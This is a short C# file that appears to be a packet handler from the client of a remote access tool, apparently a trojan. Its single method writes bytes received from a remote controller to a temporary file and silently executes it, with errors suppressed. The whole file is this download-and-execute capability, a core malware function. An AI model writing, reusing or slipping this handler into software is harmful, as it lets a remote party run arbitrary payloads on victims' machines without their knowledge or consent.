using System;
using System.Diagnostics;
using System.IO;

namespace Client.PacketHandler
{
    public class HandlerDownloadExecute
    {
        public void DownloadExecute(byte[] fileBytes, string fileExtension)
        {
            try
            {
                string tempFile = Path.GetTempFileName() + fileExtension;
                using (FileStream fileStream = new FileStream(tempFile, FileMode.Create))
                {
                    fileStream.Write(fileBytes, 0, fileBytes.Length);
                }
                Process.Start(tempFile);
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex);
            }
        }
    }
}
